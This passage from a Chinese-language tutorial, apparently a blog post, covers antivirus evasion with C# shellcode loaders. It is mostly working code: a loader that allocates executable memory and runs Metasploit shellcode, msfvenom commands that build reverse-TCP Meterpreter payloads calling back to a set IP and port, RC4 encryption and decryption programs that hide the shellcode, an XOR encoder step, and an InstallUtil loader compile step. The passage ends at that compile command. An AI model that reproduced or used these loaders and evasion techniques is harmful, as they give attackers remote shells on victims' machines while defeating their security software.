<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">TCPMeterpreterProcess</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// native function’s compiled code</span></span><br><span class="line">            <span class="comment">// generated with metasploit</span></span><br><span class="line">            <span class="built_in">byte</span>[] shellcode = <span class="keyword">new</span> <span class="built_in">byte</span>[] &#123; msfvenom生成的 shellcode&#125;;</span><br><span class="line">            </span><br><span class="line">            UInt32 funcAddr = VirtualAlloc(<span class="number">0</span>, (UInt32)shellcode.Length,</span><br><span class="line">MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">Marshal.Copy(shellcode, <span class="number">0</span>, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">IntPtr hThread = IntPtr.Zero;</span><br><span class="line">UInt32 threadId = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// prepare data</span></span><br><span class="line">IntPtr pinfo = IntPtr.Zero;</span><br><span class="line"><span class="comment">// execute native code</span></span><br><span class="line">hThread = CreateThread(<span class="number">0</span>, <span class="number">0</span>, funcAddr, pinfo, <span class="number">0</span>, <span class="keyword">ref</span> threadId);</span><br><span class="line">WaitForSingleObject(hThread, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> UInt32 MEM_COMMIT = <span class="number">0x1000</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> UInt32 PAGE_EXECUTE_READWRITE = <span class="number">0x40</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">VirtualAlloc</span>(<span class="params">UInt32 lpStartAddr,</span></span></span><br><span class="line"><span class="params"><span class="function">UInt32 size, UInt32 flAllocationType, UInt32 flProtect</span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">bool</span> <span class="title">VirtualFree</span>(<span class="params">IntPtr lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">UInt32 dwSize, UInt32 dwFreeType</span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">UInt32 lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">UInt32 dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">UInt32 lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">IntPtr param,</span></span></span><br><span class="line"><span class="params"><span class="function">UInt32 dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">ref</span> UInt32 lpThreadId</span></span></span><br><span class="line"><span class="params"><span class="function"></span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">bool</span> <span class="title">CloseHandle</span>(<span class="params">IntPtr handle</span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">WaitForSingleObject</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">IntPtr hHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">UInt32 dwMilliseconds</span></span></span><br><span class="line"><span class="params"><span class="function"></span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">GetModuleHandle</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function"><span class="built_in">string</span> moduleName</span></span></span><br><span class="line"><span class="params"><span class="function"></span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">GetProcAddress</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">IntPtr hModule,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="built_in">string</span> procName</span></span></span><br><span class="line"><span class="params"><span class="function"></span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">LoadLibrary</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function"><span class="built_in">string</span> lpFileName</span></span></span><br><span class="line"><span class="params"><span class="function"></span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">GetLastError</span>()</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在vs2019中新建C#项目(选择控制台应用(.NET Framwork)),编译运行</p>
<p>msf开启监听，正常执行生成的exe。</p>
<h4 id="2-C-加密处理shellcode免杀"><a href="#2-C-加密处理shellcode免杀" class="headerlink" title="2.C#+加密处理shellcode免杀"></a>2.C#+加密处理shellcode免杀</h4><p>先用msf生成基于c#的shellcode</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.30 LPORT=3333 -f csharp -o payload.txt</span><br></pre></td></tr></table></figure>

<p>把上面<code>payload.txt</code>中的c#代码放入下面的加密代码中</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.CompilerServices;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Payload_Encrypt_Maker</span></span><br><span class="line">&#123; <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;  </span><br><span class="line">         <span class="comment">// 加密密钥，可以更改，加解密源码中保持KEY一致就行</span></span><br><span class="line">        <span class="keyword">static</span> <span class="built_in">byte</span>[] KEY = &#123; <span class="number">0x11</span>, <span class="number">0x22</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x01</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span> &#125;;</span><br><span class="line">        <span class="keyword">static</span> <span class="built_in">byte</span>[] IV = &#123; <span class="number">0x00</span>, <span class="number">0xcc</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xcc</span> &#125;;</span><br><span class="line">        <span class="keyword">static</span> <span class="built_in">byte</span>[] payload =&#123;<span class="number">0x6b</span>,<span class="number">0xa9</span>&#125;;    <span class="comment">// 替换成MSF生成的shellcode</span></span><br><span class="line">      </span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">Encryption_Class</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">Encrypt</span>(<span class="params"><span class="built_in">string</span> key, <span class="built_in">string</span> data</span>)</span></span><br><span class="line">            &#123;</span><br><span class="line">                Encoding unicode = Encoding.Unicode;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> Convert.ToBase64String(Encrypt(unicode.GetBytes(key), unicode.GetBytes(data)));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">Encrypt</span>(<span class="params"><span class="built_in">byte</span>[] key, <span class="built_in">byte</span>[] data</span>)</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> EncryptOutput(key, data).ToArray();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">           </span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">EncryptInitalize</span>(<span class="params"><span class="built_in">byte</span>[] key</span>)</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">byte</span>[] s = Enumerable.Range(<span class="number">0</span>, <span class="number">256</span>)</span><br><span class="line">                  .Select(i =&gt; (<span class="built_in">byte</span>)i)</span><br><span class="line">                  .ToArray();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    j = (j + key[i % key.Length] + s[i]) &amp; <span class="number">255</span>;</span><br><span class="line"></span><br><span class="line">                    Swap(s, i, j);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> IEnumerable&lt;<span class="built_in">byte</span>&gt; <span class="title">EncryptOutput</span>(<span class="params"><span class="built_in">byte</span>[] key, IEnumerable&lt;<span class="built_in">byte</span>&gt; data</span>)</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">byte</span>[] s = EncryptInitalize(key);</span><br><span class="line"></span><br><span class="line">                <span class="built_in">int</span> i = <span class="number">0</span>;</span><br><span class="line">                <span class="built_in">int</span> j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> data.Select((b) =&gt;</span><br><span class="line">                &#123;</span><br><span class="line">                    i = (i + <span class="number">1</span>) &amp; <span class="number">255</span>;</span><br><span class="line">                    j = (j + s[i]) &amp; <span class="number">255</span>;</span><br><span class="line"></span><br><span class="line">                    Swap(s, i, j);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> (<span class="built_in">byte</span>)(b ^ s[(s[i] + s[j]) &amp; <span class="number">255</span>]);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Swap</span>(<span class="params"><span class="built_in">byte</span>[] s, <span class="built_in">int</span> i, <span class="built_in">int</span> j</span>)</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">byte</span> c = s[i];</span><br><span class="line"></span><br><span class="line">                s[i] = s[j];</span><br><span class="line">                s[j] = c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">byte</span>[] result = Encryption_Class.Encrypt(KEY, payload);</span><br><span class="line">            <span class="built_in">int</span> b = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; result.Length; i++)</span><br><span class="line">            &#123;   b++;</span><br><span class="line">                <span class="keyword">if</span> (i == result.Length+<span class="number">1</span>)</span><br><span class="line">                &#123;Console.Write(result[i].ToString());&#125;</span><br><span class="line">                <span class="keyword">if</span> (i != result.Length) &#123; Console.Write(result[i].ToString() + <span class="string">&quot;,&quot;</span>); &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译生成一段加密后的shellcode,要查看这段shellcode，直接到生成的exe目录下打开cmd，输入exe文件名即可查看。</p>
<p>在vs2017中再新建C#解密项目</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">using</span> System.Threading;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.CompilerServices;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">NativePayload_Reverse_tcp</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Shellcode.Exec();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title">Shellcode</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Exec</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> Payload_Encrypted;</span><br><span class="line">            Payload_Encrypted = <span class="string">&quot;0,244,36,163,code_herer&quot;</span>;</span><br><span class="line">            <span class="built_in">string</span>[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(<span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">            <span class="built_in">byte</span>[] _X_to_Bytes = <span class="keyword">new</span> <span class="built_in">byte</span>[Payload_Encrypted_Without_delimiterChar.Length];</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; Payload_Encrypted_Without_delimiterChar.Length; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">byte</span> current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());</span><br><span class="line">                _X_to_Bytes[i] = current;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 解密密钥，可以更改，加解密源码中保持KEY一致就行</span></span><br><span class="line">            <span class="built_in">byte</span>[] KEY = &#123; <span class="number">0x11</span>, <span class="number">0x22</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x01</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span> &#125;;</span><br><span class="line">            <span class="built_in">byte</span>[] MsfPayload = Decrypt(KEY, _X_to_Bytes);</span><br><span class="line">            <span class="comment">// 加载shellcode</span></span><br><span class="line">            IntPtr returnAddr = VirtualAlloc((IntPtr)<span class="number">0</span>, (<span class="built_in">uint</span>)Math.Max(MsfPayload.Length, <span class="number">0x1000</span>), <span class="number">0x3000</span>, <span class="number">0x40</span>);</span><br><span class="line">            Marshal.Copy(MsfPayload, <span class="number">0</span>, returnAddr, MsfPayload.Length);</span><br><span class="line">            CreateThread((IntPtr)<span class="number">0</span>, <span class="number">0</span>, returnAddr, (IntPtr)<span class="number">0</span>, <span class="number">0</span>, (IntPtr)<span class="number">0</span>);</span><br><span class="line">            Thread.Sleep(<span class="number">2000</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">Decrypt</span>(<span class="params"><span class="built_in">byte</span>[] key, <span class="built_in">byte</span>[] data</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> EncryptOutput(key, data).ToArray();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">EncryptInitalize</span>(<span class="params"><span class="built_in">byte</span>[] key</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">byte</span>[] s = Enumerable.Range(<span class="number">0</span>, <span class="number">256</span>)</span><br><span class="line">              .Select(i =&gt; (<span class="built_in">byte</span>)i)</span><br><span class="line">              .ToArray();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                j = (j + key[i % key.Length] + s[i]) &amp; <span class="number">255</span>;</span><br><span class="line">                Swap(s, i, j);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> IEnumerable&lt;<span class="built_in">byte</span>&gt; <span class="title">EncryptOutput</span>(<span class="params"><span class="built_in">byte</span>[] key, IEnumerable&lt;<span class="built_in">byte</span>&gt; data</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">byte</span>[] s = EncryptInitalize(key);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">int</span> i = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">int</span> j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> data.Select((b) =&gt;</span><br><span class="line">            &#123;</span><br><span class="line">                i = (i + <span class="number">1</span>) &amp; <span class="number">255</span>;</span><br><span class="line">                j = (j + s[i]) &amp; <span class="number">255</span>;</span><br><span class="line"></span><br><span class="line">                Swap(s, i, j);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> (<span class="built_in">byte</span>)(b ^ s[(s[i] + s[j]) &amp; <span class="number">255</span>]);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Swap</span>(<span class="params"><span class="built_in">byte</span>[] s, <span class="built_in">int</span> i, <span class="built_in">int</span> j</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">byte</span> c = s[i];</span><br><span class="line"></span><br><span class="line">            s[i] = s[j];</span><br><span class="line">            s[j] = c;</span><br><span class="line">        &#125;</span><br><span class="line">        [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">VirtualAlloc</span>(<span class="params">IntPtr lpAddress, <span class="built_in">uint</span> dwSize, <span class="built_in">uint</span> flAllocationType, <span class="built_in">uint</span> flProtect</span>)</span>;</span><br><span class="line">        [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params">IntPtr lpThreadAttributes, <span class="built_in">uint</span> dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, <span class="built_in">uint</span> dwCreationFlags, IntPtr lpThreadId</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行生成的exe,msf正常上线</p>
<h4 id="3-XOR-AES编码shellcode"><a href="#3-XOR-AES编码shellcode" class="headerlink" title="3.XOR&#x2F;AES编码shellcode"></a>3.XOR&#x2F;AES编码shellcode</h4><p>先用msfvenom生成一个raw格式的shellcode</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.43.30 lport=3333  -f raw &gt; shellcode.raw</span><br></pre></td></tr></table></figure>

<p>在<code>ShellcodeWrapper</code>文件夹中执行下面命令，其中<code>se_null</code>为自己设置的key。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shellcode_encoder.py -cs shellcode.raw se_null xor</span><br></pre></td></tr></table></figure>

<p>生成的<code>encryptedShellcodeWrapper_xor.cs</code>文件中的C#源码放在vs2019中编译运行即可。</p>
<h3 id="2-加载器加载C-代码"><a href="#2-加载器加载C-代码" class="headerlink" title="2.加载器加载C#代码"></a>2.加载器加载C#代码</h3><h4 id="1-使用CSC-InstallUtil执行shellcode（VT-37-71-shell-exe不能过360）"><a href="#1-使用CSC-InstallUtil执行shellcode（VT-37-71-shell-exe不能过360）" class="headerlink" title="1.使用CSC+InstallUtil执行shellcode（VT:37&#x2F;71  shell.exe不能过360）"></a>1.使用CSC+InstallUtil执行shellcode（VT:37&#x2F;71  shell.exe不能过360）</h4><p>先通过msfvenom生成C＃的shellcode</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i <span class="number">6</span> -b <span class="string">&#x27;\x00&#x27;</span> lhost=<span class="number">192.168</span><span class="number">.43</span><span class="number">.30</span> lport=<span class="number">3333</span> -f csharp</span><br></pre></td></tr></table></figure>

<p>下载InstallUtil-Shellcode.cs</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/InstallUtil-Shellcode.cs</span><br></pre></td></tr></table></figure>

<p>将上面生成的shellcode复制到<code>InstallUtil-Shellcode.cs</code>文件中。</p>
<p>使用csc(以下.NET版本不是唯一可以执行的)编译InstallUtil-ShellCode.cs</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /unsafe /platform:x86 /out:C:\test\shell.exe C:\test\InstallUtil-ShellCode.cs</span><br></pre></td></tr></table></figure>

